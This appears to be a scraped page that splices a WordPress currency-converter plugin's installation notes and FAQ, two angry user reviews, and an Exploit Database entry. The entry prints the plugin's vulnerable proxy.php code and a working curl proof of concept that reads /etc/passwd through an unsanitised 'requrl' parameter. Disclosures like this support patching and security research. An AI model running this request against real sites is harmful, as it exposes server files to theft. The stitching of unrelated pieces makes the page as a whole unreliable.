## Installation

PayPal Currency Converter BASIC for WooCommerce installs like any WordPress plug-in.

PRECONDITION:

WooCommerce installed and activated.

MANDATORY SETTINGS:

1. Find the settings page in WooCommerce’s sub menu.

2. First time only: Select your target Currency

3. Optionally register a valid API ID and activate it with the radio button or use Yahoo Finance, or European Central Bank as your exchange rate provider

3. Save settings to invoke the exchange rate retrieval and optionally check the time-stamp of last update. (see 2-Target-EXR-and-API-ID-registered-and-saved.jpg and 3-last-update.jpg)

4. Accept the suggested exchange rate shown in the button. (see 4-EXR-Accepted.jpg)

5. Save settings again. (see 5-EXR-Accepted-and settings-saved.jpg)

OPTIONAL SETTINGS:

Virtual product order auto completion can be established while checking “Auto-Complete”.

This completes orders after succesful payment, but only for virtual products.

After order completion the plug-in will add notes to the order. (see 9-PPCC-order-notes.jpg)

AUTOMATIC EXR UPDATES

For automatic updates you have two options.

One option is to use a suitable Cron-Job plug-in like “WP-Crontrol” and register the hook “ppcc\_cexr\_update” for your desired update frequency.

(see 7-Cron-job.jpg)

Another option is to call the given AJAX url (http://yourdomain.com/wp-admin/admin-ajax.php?action=ppcc&ppcc\_function=cexr\_update) from your hosting servers cron job.

(This ensures a accurate timing for the updates.)

HANDLING FEE

You may want to set handling percentage and/or a fixed handling amount in the targeted currency

LOG / EMAIL NOTIFICATION

If the check-box “log” is checked an email notification will be sent to the admin’s email address every time the exchange rate is updated with date, time, and exchange rate value.

Furthermore the log file will be populated with every action the plug-in does.

The log file can be found and viewed in the indicated location while using your FTP client.

For additional convenience you can open the log-file in a pop up window.

To make this work add: “Allow from ” to the .htaccess file inside “../plug-ins/woocommerce/logs/”

When the currently saved currency exchange rate is equal with the actual currency exchange rate the value is indicated by green font colour.

A difference between the saved currency exchange rate and the actual is indicated by red coloured value and through warning message.

CUSTOM CURRENCY

If you need a custom currency,check the check-box “Use Custom Currency”, then you will see 3 new text input fields

called Code, Symbol, and Name. Fill this out with the appropriate settings.

For example: Code=XOF, Symbol=XOF, Name= XFA Franc

Save your settings and navigate to WooCommerce’s settings page where you should find your new custom currency.

Select it and save your settings.

Navigate back to PayPal Currency Converte Pro settings page to check if everything is set.

## FAQ

### How can I have automated exchange rate updates?

Simply add WPcrontrol plug-in and call the hook given on the admin page or use an external cron job scheduler that calls the Ajax URl as shown on the admin page.

### How can I have 5 digits accuracy?

Choose Open Exchangerate API or ECB as your data provider.

### How can the TAX be converted?

Tax and shipping rate conversion is working out of the box.

### How can I show the conversion rate on the checkout page?

You can set the PayPal Description with predefined HTML code to show the conversion rate, and all other payment details in the payment description. See the INFO tab in the backend.

### How can I show the converted total, tax, and conversion rate on the checkout page?

This is new since version 1.6:

You may use this span tags with specific ids to pull the total, the tax, and the conversion rate inside a supported payment gateway description.

Example Description:

**Order Total (Includes Tax)**

(Currency conversion rate = )

Even the PRO Version doesn’t work. Made me loose money, with all the refunds I have to give back to my customers.
Author is not interested in giving me a refund and making fun of me and my company on Codecanyon.

It doesn’t work. The currency is not converted. It just passes the amount (no matter of which currency it is) to Paypal which is obviously inaccurate.

# Exploit Author: Kuroi'SH
# Software Link:
https://wordpress.org/plugins/paypal-currency-converter-basic-for-woocommerce/
# Version: <=1.3
# Tested on: Linux
 Description:
 proxy.php's code:
 <?php
$file = file_get_contents($_GET['requrl']);
$left=strpos($file,'<div id=currency_converter_result>');
$right=strlen($file)-strpos($file,'<input type=hidden name=meta');
$snip= substr($file,$left,$right);
echo $snip;
?>
Based on user input, the content of a file is printed out (unfortunately
not included) so any html file can be loaded, and an attacker may be able
to read  any local file which
is not executed in the server.
Example:
http://localhost/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=/etc/passwd
POC:
curl --silent --url
http://localhost/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=/etc/passwd

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
